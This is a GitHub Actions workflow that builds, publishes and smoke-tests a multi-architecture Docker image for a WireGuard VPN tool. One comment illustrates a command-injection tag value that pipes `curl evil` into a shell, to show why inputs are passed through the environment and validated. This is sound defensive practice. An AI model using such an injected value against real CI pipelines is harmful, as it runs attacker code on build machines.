# Build the quick-start image and publish it to this repository's package.
#
# It runs HERE, in the public repository, on purpose. The image contains no
# source - it downloads the released binary and checks it against the published
# SHA256SUMS - and a package built from a public repository is public, which is
# the whole point of a quick start. Building it in the private source repo would
# produce a package nobody could pull without being invited.
name: image

on:
  release:
    types: [published]
  workflow_dispatch:
    inputs:
      version:
        description: "Release version to package, without the v (e.g. 1.5.1)"
        required: true

permissions:
  contents: read
  packages: write

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Work out which release we are packaging
        id: v
        # The tag and the dispatch input are attacker-influenceable text, so they
        # go through the environment rather than being interpolated straight into
        # the shell - `${{ }}` substitution happens BEFORE the shell parses the
        # line, so a tag like `1.5.1"; curl evil | sh #` would otherwise execute.
        # Reading $EVENT/$TAG/$INPUT as shell variables makes them inert data.
        env:
          EVENT: ${{ github.event_name }}
          TAG: ${{ github.event.release.tag_name }}
          INPUT: ${{ inputs.version }}
        run: |
          if [ "$EVENT" = "release" ]; then
            V="${TAG#v}"
          else
            V="$INPUT"
          fi
          # Refuse anything that is not a plain version, so a malformed value
          # cannot travel downstream into the unquoted docker run steps.
          case "$V" in
            *[!0-9.]*|"") echo "refusing suspicious version: '$V'" >&2; exit 1 ;;
          esac
          echo "version=$V" >> "$GITHUB_OUTPUT"
          echo "packaging $V"

      - uses: docker/setup-qemu-action@v3
      - uses: docker/setup-buildx-action@v3

      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      # Both architectures the release ships. The Dockerfile picks the matching
      # binary from TARGETARCH, so a arm64 image can never end up carrying the
      # amd64 build.
      - uses: docker/build-push-action@v5
        with:
          context: .
          platforms: linux/amd64,linux/arm64
          push: true
          build-args: |
            VERSION=${{ steps.v.outputs.version }}
          tags: |
            ghcr.io/wonderingstars/bondvpn:${{ steps.v.outputs.version }}
            ghcr.io/wonderingstars/bondvpn:latest

      # A tag that exists but cannot start is worse than no image: pull it back
      # and make it prove itself. `check` reads everything and changes nothing,
      # so it is safe to run on a build agent.
      - name: Prove the published image runs
        env:
          IMAGE: ghcr.io/wonderingstars/bondvpn:${{ steps.v.outputs.version }}
        run: |
          set -eu
          docker run --rm --entrypoint bondvpn "$IMAGE" version

          # The two things whose absence makes this image useless on a NAS, and
          # that nothing else in this job would notice: wireguard-tools alone
          # needs a kernel that HAS WireGuard, and Alpine's iptables is the
          # nf_tables build, which a 4.4 kernel cannot use.
          docker run --rm --entrypoint sh "$IMAGE" -c \
            'command -v wireguard-go && command -v iptables-legacy'

          # `check` is run the way the README tells people to run the image.
          # Without the tun device it fails for a reason that says nothing about
          # the image - it did exactly that here on v1.8.0, failing a release
          # whose image was fine, while wireguard-go sat inside it the whole
          # time.
          sudo modprobe tun || true
          mkdir -p /tmp/wg
          printf '[Interface]\nTable = off\n[Peer]\nPersistentKeepalive = 25\n' > /tmp/wg/wg0.conf
          docker run --rm --cap-add NET_ADMIN --device /dev/net/tun \
            -v /tmp/wg:/etc/wireguard:ro "$IMAGE" check
